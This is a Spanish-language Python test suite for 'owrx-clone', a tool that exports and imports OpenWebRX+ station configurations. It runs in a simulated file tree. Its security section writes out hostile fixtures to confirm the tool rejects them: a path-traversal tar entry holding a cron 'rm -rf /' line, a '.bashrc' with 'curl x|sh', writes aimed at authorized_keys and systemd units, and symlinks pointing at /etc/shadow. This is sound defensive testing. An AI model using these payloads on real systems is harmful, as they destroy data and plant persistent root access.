#!/usr/bin/env python3
"""v4.2 · owrx-clone: exportar una estación OpenWebRX+ de mentira (un árbol de ficheros con su
dpkg, apt, /etc y /var/lib) e importarla en otra, sin tocar este equipo (OWRX_CLONE_RAIZ y
órdenes simuladas). Comprueba qué entra y qué no en cada nivel, el modo público, el cifrado,
las sumas, los ficheros maliciosos, el plan de paquetes, --mapear, los parches por versión,
la copia previa y deshacer."""
import contextlib
import hashlib
import importlib.machinery
import importlib.util
import io
import json
import os
import shutil
import subprocess
import tarfile
import tempfile

RAIZ_KIT = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..')
HERR = os.path.join(RAIZ_KIT, 'owrx-clone', 'owrx-clone')
spec = importlib.util.spec_from_loader('owrx_clone', importlib.machinery.SourceFileLoader('owrx_clone', HERR))
oc = importlib.util.module_from_spec(spec)
spec.loader.exec_module(oc)
oc.SIMULAR_ORDENES = True
os.environ['OWRX_CLONE_ARCH'] = 'arm64'
T = tempfile.mkdtemp()
HT = '/usr/lib/python3/dist-packages/htdocs'


def poner(raiz, ruta, texto, modo=0o644):
    p = raiz + ruta
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, 'wb') as f:
        f.write(texto if isinstance(texto, bytes) else texto.encode())
    os.chmod(p, modo)


def md5t(t):
    return hashlib.md5(t.encode()).hexdigest()


def dpkg(raiz, paquetes, md5s=None, auto=()):
    poner(raiz, '/var/lib/dpkg/status', '\n\n'.join(
        'Package: %s\nStatus: install ok installed\nVersion: %s\nArchitecture: all' % (p, v) for p, v in paquetes.items()) + '\n')
    poner(raiz, '/var/lib/apt/extended_states', ''.join('Package: %s\nArchitecture: arm64\nAuto-Installed: 1\n\n' % p for p in auto))
    if md5s is not None:
        poner(raiz, '/var/lib/dpkg/info/openwebrx.md5sums', ''.join('%s  %s\n' % (m, r.lstrip('/')) for r, m in md5s.items()))


def correr(raiz, *args):
    oc.RAIZ = raiz
    oc.ORDENES.clear()
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        rc = oc.main(list(args))
    return rc, out.getvalue() + err.getvalue()


# ------------------------------------------------------------------ estación de origen
A = os.path.join(T, 'origen')
INDEX, SAMPLE, MODES = '<html>owrx</html>', '// muestra', 'MODOS = []\n'
md5s = {HT + '/index.html': md5t(INDEX), HT + '/plugins/receiver/init.js.sample': md5t(SAMPLE),
        '/usr/lib/python3/dist-packages/owrx/modes.py': md5t(MODES)}
dpkg(A, {'openwebrx': '1.2.125', 'soapysdr-module-rtlsdr': '0.3', 'rtl-sdr': '2.0.2', 'libfoo1': '1', 'wsjtx': '2.7',
         'librtlsdr-dev': '2.0.2', 'nano': '7'}, md5s, auto=('libfoo1', 'soapysdr-module-rtlsdr'))
poner(A, '/etc/os-release', 'ID=debian\nVERSION_CODENAME=bookworm\nPRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\n')
poner(A, HT + '/index.html', INDEX)
poner(A, HT + '/plugins/receiver/init.js.sample', SAMPLE)
poner(A, '/usr/lib/python3/dist-packages/owrx/modes.py', MODES + '# BRICOHAMS-FT2 parche\n')        # retocado
poner(A, HT + '/plugins/receiver/init.js', "for (const name of ['mio']) { await Plugins.load(name); }\n")
poner(A, HT + '/plugins/receiver/mio/mio.js', 'Plugins.mio.init=function(){return true}')
poner(A, HT + '/plugins/receiver/init.js.antes-20261001', 'viejo')
poner(A, HT + '/plugins/receiver/mio/__pycache__/x.pyc', 'pyc')
SET = {'receiver_name': 'EA5KAO · Mi QTH', 'aprs_igate_password': '12345', 'receiver_keys': ['abc'],
       'magic_key': 'secreta', 'receiver_gps': {'lat': 38.08, 'lon': -1.25},
       'sdrs': {'rtl': {'name': 'HAM', 'type': 'rtl_sdr', 'device': 'serial=00000102', 'profiles': {'2m': {}, '70': {}}},
                'v3': {'name': 'MULTI', 'type': 'rtl_sdr', 'device': '00000103', 'profiles': {'fm': {}}}}}
poner(A, '/var/lib/openwebrx/settings.json', json.dumps(SET), 0o644)
poner(A, '/var/lib/openwebrx/users.json', '[{"user":"admin","password":{"encoding":"hash"}}]', 0o600)
poner(A, '/var/lib/openwebrx/bookmarks.json', '[{"name":"RU-75","frequency":438775000,"modulation":"nfm"}]')
poner(A, '/var/lib/openwebrx/receiver_top_photo.png', b'\x89PNG...')
poner(A, '/var/lib/openwebrx/eibi.json', '{"cache": true}')
poner(A, '/etc/openwebrx/openwebrx.conf', '[core]\ndata_directory = /var/lib/openwebrx\n[web]\nport = 8073\n')
poner(A, '/etc/openwebrx/openwebrx.conf.d/90-mio.conf', '[core]\nlog_level = DEBUG\n')
poner(A, '/etc/openwebrx/bookmarks.d/club.json', '[]')
poner(A, '/etc/udev/rules.d/99-sdr.rules', 'SUBSYSTEM=="usb", ATTRS{idVendor}=="0bda", MODE="0666"\n')
poner(A, '/etc/modprobe.d/rtl.conf', 'blacklist dvb_usb_rtl28xxu\n')
poner(A, '/etc/modprobe.d/nada.conf', 'options snd foo=1\n')
poner(A, '/etc/systemd/system/openwebrx.service.d/override.conf', '[Service]\nNice=-5\n')
poner(A, '/etc/apt/sources.list.d/openwebrx-plus.list', 'deb [signed-by=/x] https://luarvique.github.io/ppa/bookworm ./\n')

perfil = os.path.join(T, 'estacion.owrx.tar.gz')
rc, out = correr(A, 'exportar', '-o', perfil, '--nota', 'prueba')
assert rc == 0, out
assert oct(os.stat(perfil).st_mode & 0o777) == '0o600', 'el perfil lleva claves: 600'
m, tmp = oc.abrir_perfil(perfil)
rutas = {e['ruta']: e for e in m['ficheros']}
for r in ('{DATA}/settings.json', '{DATA}/users.json', '{DATA}/bookmarks.json', '{DATA}/receiver_top_photo.png',
          '/etc/openwebrx/openwebrx.conf', '/etc/openwebrx/openwebrx.conf.d/90-mio.conf', '/etc/openwebrx/bookmarks.d/club.json',
          '{HTDOCS}/plugins/receiver/init.js', '{HTDOCS}/plugins/receiver/mio/mio.js',
          '/usr/lib/python3/dist-packages/owrx/modes.py', '/etc/udev/rules.d/99-sdr.rules', '/etc/modprobe.d/rtl.conf',
          '/etc/systemd/system/openwebrx.service.d/override.conf'):
    assert r in rutas, ('falta', r, sorted(rutas))
for r in ('{DATA}/eibi.json', '{HTDOCS}/index.html', '{HTDOCS}/plugins/receiver/init.js.sample',
          '{HTDOCS}/plugins/receiver/init.js.antes-20261001', '{HTDOCS}/plugins/receiver/mio/__pycache__/x.pyc', '/etc/modprobe.d/nada.conf'):
    assert r not in rutas, ('sobra', r)
assert rutas['/usr/lib/python3/dist-packages/owrx/modes.py']['nivel'] == 'parches'
assert rutas['{DATA}/users.json']['modo'] == '0600'
assert [p['nombre'] for p in m['paquetes']] == ['openwebrx', 'rtl-sdr', 'wsjtx'], m['paquetes']
assert m['receptores'][0]['device'] == 'serial=00000102' and m['nota'] == 'prueba' and m['secretos'] == 'incluidos'
assert any('ppa/bookworm' in r for r in m['repos'])
assert json.load(open(os.path.join(tmp, rutas['{DATA}/settings.json']['arc'])))['aprs_igate_password'] == '12345'
shutil.rmtree(tmp)
rc, out = correr(A, 'ver', perfil)
assert rc == 0 and 'HAM' in out and 'serial=00000102' in out and 'parches' in out, out

# modo público: sin usuarios y claves en blanco
pub = os.path.join(T, 'publico.owrx.tar.gz')
rc, out = correr(A, 'exportar', '-o', pub, '--publico', '--niveles', 'config,web')
m2, tmp = oc.abrir_perfil(pub)
s2 = json.load(open(os.path.join(tmp, 'archivos/config/DATA/settings.json')))
assert s2['aprs_igate_password'] == '' and s2['receiver_keys'] == [] and s2['magic_key'] == '' and s2['receiver_gps']['lat'] == 38.08
assert '{DATA}/users.json' not in {e['ruta'] for e in m2['ficheros']} and m2['secretos'] == 'quitados'
assert set(m2['niveles']) == {'config', 'web'} and 'aprs_igate_password' in m2['secretos_quitados']
shutil.rmtree(tmp)

# cifrado (openssl)
if shutil.which('openssl'):
    os.environ['OWRX_CLONE_CLAVE'] = 'una clave larga'
    cif = os.path.join(T, 'cifrado.owrx.tar.gz')
    rc, out = correr(A, 'exportar', '-o', cif, '--cifrar')
    assert rc == 0 and open(cif + '.enc', 'rb').read(8) == b'Salted__', out
    assert b'aprs_igate_password' not in open(cif + '.enc', 'rb').read()
    m3, tmp = oc.abrir_perfil(cif + '.enc'); shutil.rmtree(tmp)
    assert len(m3['ficheros']) == len(m['ficheros'])
    os.environ['OWRX_CLONE_CLAVE'] = 'otra distinta'
    rc, out = correr(A, 'ver', cif + '.enc')
    assert rc == 1 and 'contraseña' in out
    del os.environ['OWRX_CLONE_CLAVE']

# perfil manipulado y perfil malicioso
def rehacer(origen, destino, cambio):
    with tarfile.open(origen) as t, tarfile.open(destino, 'w:gz') as o:
        for mi in t.getmembers():
            datos = t.extractfile(mi).read()
            datos, mi = cambio(mi, datos)
            mi.size = len(datos)
            o.addfile(mi, io.BytesIO(datos))


manip = os.path.join(T, 'manip.owrx.tar.gz')
rehacer(perfil, manip, lambda mi, d: (d.replace(b'EA5KAO', b'EA9XXX'), mi) if mi.name.endswith('settings.json') else (d, mi))
rc, out = correr(A, 'ver', manip)
assert rc == 1 and 'SHA-256' in out, out
malo = os.path.join(T, 'malo.owrx.tar.gz')
with tarfile.open(malo, 'w:gz') as t:
    ti = tarfile.TarInfo('../../etc/cron.d/x'); d = b'* * * * * root rm -rf /'; ti.size = len(d); t.addfile(ti, io.BytesIO(d))
rc, out = correr(A, 'ver', malo)
assert rc == 1 and 'no permitida' in out
# manifiesto que pide escribir fuera de su sitio (con la suma correcta): se salta
def a_shadow(mi, d):
    if mi.name == 'manifiesto.json':
        j = json.loads(d)
        for e in j['ficheros']:
            if e['ruta'] == '/etc/udev/rules.d/99-sdr.rules':
                e['ruta'] = '/etc/udev/rules.d/../../shadow'
                e['arc'] = oc.arc_de(e['nivel'], e['ruta'])
        d = json.dumps(j).encode()
    if mi.name.endswith('99-sdr.rules'):
        mi.name = oc.arc_de('sistema', '/etc/udev/rules.d/../../shadow')
    return d, mi


trampa = os.path.join(T, 'trampa.owrx.tar.gz')
rehacer(perfil, trampa, a_shadow)
rc, out = correr(A, 'ver', trampa)
assert rc == 1, 'una ruta con «..» en el paquete se rechaza al abrirlo'

# ------------------------------------------------------------------ destino sin OpenWebRX+
B = os.path.join(T, 'destino')
dpkg(B, {'nano': '7'}, md5s=None)
poner(B, '/etc/os-release', 'ID=debian\nVERSION_CODENAME=trixie\nPRETTY_NAME="Debian GNU/Linux 13 (trixie)"\n')
poner(B, '/var/lib/openwebrx/settings.json', '{"receiver_name": "viejo"}')            # se sobrescribe y deshacer lo devuelve
rc, out = correr(B, 'importar', perfil, '--simular', '--detalle')
assert rc == 0 and 'ppa/trixie' in out and 'openwebrx, rtl-sdr, wsjtx' in out and 'Simulación' in out, out
assert 'sistema' in out and 'NO se aplican' in out
assert not os.path.exists(B + HT + '/plugins/receiver/init.js'), '--simular no escribe'
rc, out = correr(B, 'importar', perfil, '--si', '--todo', '--mapear', 'serial=00000102=>serial=ABCDEF12')
assert rc == 0, out
assert any(o.startswith('apt-get install') and 'openwebrx rtl-sdr wsjtx' in o for o in oc.ORDENES), oc.ORDENES
assert 'systemctl stop openwebrx' in oc.ORDENES and 'systemctl start openwebrx' in oc.ORDENES and 'udevadm control --reload' in oc.ORDENES
assert 'OpenWebRX+ aún no está instalado' in out, 'sin openwebrx previo los parches se dejan para después'
s3 = json.load(open(B + '/var/lib/openwebrx/settings.json'))
assert s3['receiver_name'] == 'EA5KAO · Mi QTH' and s3['sdrs']['rtl']['device'] == 'serial=ABCDEF12' and s3['sdrs']['v3']['device'] == '00000103'
assert open(B + HT + '/plugins/receiver/mio/mio.js').read().startswith('Plugins.mio')
assert open(B + '/etc/udev/rules.d/99-sdr.rules').read().startswith('SUBSYSTEM') and os.path.isfile(B + '/etc/openwebrx/bookmarks.d/club.json')
assert oct(os.stat(B + '/var/lib/openwebrx/users.json').st_mode & 0o777) == '0o600'
assert not os.path.exists(B + '/usr/lib/python3/dist-packages/owrx/modes.py')
assert open(B + '/etc/apt/sources.list.d/openwebrx-plus.list').read().strip().endswith('luarvique.github.io/ppa/trixie ./')
copias = sorted(f for f in os.listdir(B + oc.COPIAS) if f.endswith('.tar.gz'))
assert len(copias) == 1
# deshacer: settings.json vuelve a «viejo» y lo nuevo desaparece
rc, out = correr(B, 'deshacer', '--si')
assert rc == 0, out
assert json.load(open(B + '/var/lib/openwebrx/settings.json'))['receiver_name'] == 'viejo'
assert not os.path.exists(B + HT + '/plugins/receiver/mio/mio.js') and not os.path.exists(B + '/etc/udev/rules.d/99-sdr.rules')
rc, out = correr(B, 'deshacer', '--si')
assert rc == 1 and 'nada que deshacer' in out

# ------------------------------------------------------------------ destino con la misma versión: parches sí; otra versión: no
Cc = os.path.join(T, 'igual')
dpkg(Cc, {'openwebrx': '1.2.125', 'rtl-sdr': '2.0.2', 'wsjtx': '2.7'}, md5s)
poner(Cc, '/etc/os-release', 'ID=debian\nVERSION_CODENAME=bookworm\n')
poner(Cc, '/usr/lib/python3/dist-packages/owrx/modes.py', MODES)
rc, out = correr(Cc, 'importar', perfil, '--si', '--todo')
assert rc == 0 and 'BRICOHAMS-FT2' in open(Cc + '/usr/lib/python3/dist-packages/owrx/modes.py').read(), out
assert not any(o.startswith('apt-get install') for o in oc.ORDENES), 'ya estaban todos los paquetes'
D = os.path.join(T, 'otra')
dpkg(D, {'openwebrx': '1.2.130'}, md5s)
poner(D, '/etc/os-release', 'ID=debian\nVERSION_CODENAME=bookworm\n')
poner(D, '/usr/lib/python3/dist-packages/owrx/modes.py', MODES)
rc, out = correr(D, 'importar', perfil, '--si', '--todo', '--sin-paquetes', '--sin-usuarios')
assert rc == 0 and 'parche para 1.2.125 y aquí hay 1.2.130' in out and 'BRICOHAMS' not in open(D + '/usr/lib/python3/dist-packages/owrx/modes.py').read()
assert not os.path.exists(D + '/var/lib/openwebrx/users.json'), '--sin-usuarios'
rc, out = correr(D, 'importar', perfil, '--si', '--niveles', 'parches', '--forzar-parches', '--sin-paquetes')
assert rc == 0 and 'BRICOHAMS' in open(D + '/usr/lib/python3/dist-packages/owrx/modes.py').read()
# sistema sin repositorio
E = os.path.join(T, 'raro')
dpkg(E, {})
poner(E, '/etc/os-release', 'ID=arch\nPRETTY_NAME="Arch"\n')
rc, out = correr(E, 'importar', perfil, '--simular')
assert rc == 1 and 'sin repositorio de OpenWebRX+' in out
# ubuntu jammy → ppa/ubuntu + repo original
assert oc.repo_openwebrx({'id': 'ubuntu', 'like': 'debian', 'codename': 'jammy', 'ubuntu_codename': 'jammy', 'nombre': 'x'}, 'amd64')[0].endswith('ppa/ubuntu ./')
assert oc.repo_openwebrx({'id': 'linuxmint', 'like': 'ubuntu debian', 'codename': 'wilma', 'ubuntu_codename': 'noble', 'nombre': 'x'}, 'amd64')[0].endswith('ppa/noble ./')
# comprobar sobre el destino «igual»
rc, out = correr(Cc, 'comprobar')
assert 'settings.json válido · 2 receptor(es)' in out and 'init.js y sus plugins locales' in out, out
# ayuda
for tema in oc.AYUDA:
    rc, out = correr(A, 'ayuda', tema)
    assert rc == 0 and len(out) > 200
r = subprocess.run(['python3', HERR, '--version'], capture_output=True, text=True)
assert r.stdout.strip() == 'owrx-clone ' + oc.VERSION

# ------------------------------------------------------------------ ataques (revisión de seguridad v4.2)
def perfil_con(nombre, cambios_manifiesto, ficheros_extra):
    """Rehace el perfil con un manifiesto cambiado y ficheros añadidos (sumas correctas)."""
    destino = os.path.join(T, nombre)
    m0, tmp0 = oc.abrir_perfil(perfil)
    cambios_manifiesto(m0)
    contenido = {}
    for e in m0['ficheros']:
        contenido[e['arc']] = open(os.path.join(tmp0, e['arc']), 'rb').read() if os.path.isfile(os.path.join(tmp0, e['arc'])) else b''
    for nivel, ruta, datos in ficheros_extra:
        e = {'nivel': nivel, 'ruta': ruta, 'arc': oc.arc_de(nivel, ruta), 'sha256': hashlib.sha256(datos).hexdigest(),
             'tam': len(datos), 'modo': '0644', 'dueno': 'root', 'grupo': 'root'}
        m0['ficheros'].append(e)
        contenido[e['arc']] = datos
    for e in m0['ficheros']:
        if e['arc'] in contenido:
            e['sha256'] = hashlib.sha256(contenido[e['arc']]).hexdigest()
    shutil.rmtree(tmp0)
    oc._escribir_perfil(destino, m0, contenido, False)
    return destino


# 1. el perfil pone data_directory en /etc/cron.d → se rechaza entero
conf = b'[core]\ndata_directory = /etc/cron.d\n'


def poner_conf(m0):
    for e in m0['ficheros']:
        if e['ruta'] == '/etc/openwebrx/openwebrx.conf':
            m0['ficheros'].remove(e)
            break
malo1 = perfil_con('cron.owrx.tar.gz', poner_conf, [('etc', '/etc/openwebrx/openwebrx.conf', conf), ('config', '{DATA}/pwn', b'* * * * * root id')])
X = os.path.join(T, 'victima')
dpkg(X, {'openwebrx': '1.2.125'}, md5s)
poner(X, '/etc/os-release', 'ID=debian\nVERSION_CODENAME=bookworm\n')
rc, out = correr(X, 'importar', malo1, '--si', '--sin-paquetes')
assert rc == 1 and 'directorio de datos' in out and not os.path.exists(X + '/etc/cron.d/pwn'), out
for malo_dir in (b'/home/pi', b'/opt/bricohams/kit', b'/var/lib/polkit-1/localauthority/50-local.d', b'/var/lib/openwebrx/../../etc'):
    mp = perfil_con('dd.owrx.tar.gz', poner_conf, [('etc', '/etc/openwebrx/openwebrx.conf', b'[core]\ndata_directory = ' + malo_dir + b'\n'),
                                                   ('config', '{DATA}/.bashrc', b'curl x|sh')])
    rc, out = correr(X, 'importar', mp, '--si', '--sin-paquetes')
    assert rc == 1 and 'directorio de datos' in out and not os.path.exists(X + malo_dir.decode() + '/.bashrc'), (malo_dir, out)
# un directorio de datos nuevo y razonable sí vale
bueno = perfil_con('dd2.owrx.tar.gz', poner_conf, [('etc', '/etc/openwebrx/openwebrx.conf', b'[core]\ndata_directory = /var/lib/openwebrx-usb\n')])
rc, out = correr(X, 'importar', bueno, '--si', '--sin-paquetes')
assert rc == 0 and os.path.isfile(X + '/var/lib/openwebrx-usb/settings.json'), out
# el directorio de datos ES un enlace (lo movió el administrador a un USB): se acepta
U = os.path.join(T, 'usb')
dpkg(U, {'openwebrx': '1.2.125'}, md5s)
poner(U, '/etc/os-release', 'ID=debian\nVERSION_CODENAME=bookworm\n')
os.makedirs(U + '/media/usb/owrx')
os.symlink(U + '/media/usb/owrx', U + '/var/lib/openwebrx')
rc, out = correr(U, 'importar', perfil, '--si', '--sin-paquetes')
assert rc == 0 and os.path.isfile(U + '/media/usb/owrx/settings.json'), out
rc, out = correr(U, 'deshacer', '--si')
assert rc == 0 and not os.path.exists(U + '/media/usb/owrx/settings.json'), out
# 2. «extra» hacia sitios prohibidos: nunca, ni pidiéndolo
malo2 = perfil_con('extra.owrx.tar.gz', lambda m0: m0['niveles'].append('extra'),
                   [('extra', '/etc/cron.d/pwn', b'x'), ('extra', '/root/.bashrc', b'x'), ('extra', '/home/pi/.ssh/authorized_keys', b'x'),
                    ('extra', '/etc/systemd/system/x.service', b'x'), ('extra', '/opt/miapp/conf.ini', b'ok')])
rc, out = correr(X, 'importar', malo2, '--si', '--sin-paquetes', '--todo')
assert rc == 0 and not os.path.exists(X + '/opt/miapp/conf.ini'), '--todo no incluye «extra»'
rc, out = correr(X, 'importar', malo2, '--si', '--sin-paquetes', '--niveles', 'extra')
assert rc == 0, out
for r in ('/etc/cron.d/pwn', '/root/.bashrc', '/home/pi/.ssh/authorized_keys', '/etc/systemd/system/x.service'):
    assert not os.path.exists(X + r), r
assert open(X + '/opt/miapp/conf.ini').read() == 'ok', 'lo permitido sí se escribe'
# 3. enlace simbólico puesto por el usuario openwebrx dentro de sus carpetas: ni importar ni deshacer escriben a través de él
V = os.path.join(T, 'enlace')
dpkg(V, {'openwebrx': '1.2.125'}, md5s)
poner(V, '/etc/os-release', 'ID=debian\nVERSION_CODENAME=bookworm\n')
poner(V, '/etc/shadow', 'root:HASH:1:0:99999:7:::\n', 0o640)
os.makedirs(V + HT + '/plugins/receiver', exist_ok=True)
os.symlink(V + '/etc', V + HT + '/plugins/receiver/mio')           # «mio» → /etc
rc, out = correr(V, 'importar', perfil, '--si', '--sin-paquetes')
assert rc == 1 and 'enlace simbólico' in out and not os.path.exists(V + '/etc/mio.js'), out   # se para, sin tocar nada
assert open(V + '/etc/shadow').read().startswith('root:HASH')
os.unlink(V + HT + '/plugins/receiver/mio')
os.makedirs(V + HT + '/plugins/receiver/mio')
rc, out = correr(V, 'importar', perfil, '--si', '--sin-paquetes')   # ahora sí; deja copia previa con settings.json
os.unlink(V + '/var/lib/openwebrx/settings.json')
os.symlink(V + '/etc/shadow', V + '/var/lib/openwebrx/settings.json')    # el servicio cambia settings.json por un enlace
rc, out = correr(V, 'deshacer', '--si')
assert rc == 0 and open(V + '/etc/shadow').read().startswith('root:HASH'), 'deshacer no debe escribir a través del enlace'
# 4. deshacer guarda y devuelve enlaces como enlaces
W = os.path.join(T, 'conenlace')
dpkg(W, {'openwebrx': '1.2.125'}, md5s)
poner(W, '/etc/os-release', 'ID=debian\nVERSION_CODENAME=bookworm\n')
poner(W, '/var/lib/openwebrx/real.png', b'PNG')
os.symlink('real.png', W + '/var/lib/openwebrx/receiver_top_photo.png')
rc, out = correr(W, 'importar', perfil, '--si', '--sin-paquetes')
assert not os.path.islink(W + '/var/lib/openwebrx/receiver_top_photo.png')
rc, out = correr(W, 'deshacer', '--si')
assert os.path.islink(W + '/var/lib/openwebrx/receiver_top_photo.png') and os.readlink(W + '/var/lib/openwebrx/receiver_top_photo.png') == 'real.png'
# 5. importación cortada a medias: se apunta lo creado y deshacer lo borra
Z = os.path.join(T, 'cortada')
dpkg(Z, {'openwebrx': '1.2.125'}, md5s)
poner(Z, '/etc/os-release', 'ID=debian\nVERSION_CODENAME=bookworm\n')
original = oc.escribir_seguro
cuenta = {'n': 0}
def fallo_al_tercero(*a, **k):
    cuenta['n'] += 1
    if cuenta['n'] == 3:
        raise oc.Error('disco lleno (simulado)')
    return original(*a, **k)
oc.escribir_seguro = fallo_al_tercero
rc, out = correr(Z, 'importar', perfil, '--si', '--sin-paquetes')
oc.escribir_seguro = original
assert rc == 1 and 'se ha cortado' in out and 'systemctl start openwebrx' in oc.ORDENES, out
creados = [f for f in os.listdir(Z + oc.COPIAS) if f.endswith('.creados.json')]
assert len(creados) == 1 and len(json.load(open(Z + oc.COPIAS + '/' + creados[0]))) >= 2   # los 2 escritos (+ el que falló)
rc, out = correr(Z, 'deshacer', '--si')
assert rc == 0 and not os.listdir(Z + '/var/lib/openwebrx'), os.listdir(Z + '/var/lib/openwebrx')
# 6. deshacer con el nombre suelto de la copia
rc, out = correr(Cc, 'deshacer', '--si', sorted(f for f in os.listdir(Cc + oc.COPIAS) if f.endswith('.tar.gz'))[-1])
assert rc == 0, out

shutil.rmtree(T)
print('OK test_owrx_clone: exportar/ver/importar/deshacer/comprobar; niveles, público, cifrado, sumas, rutas maliciosas, '
      'paquetes, --mapear, parches por versión, repositorios por sistema y ataques (data_directory, extra, enlaces, corte a medias)')
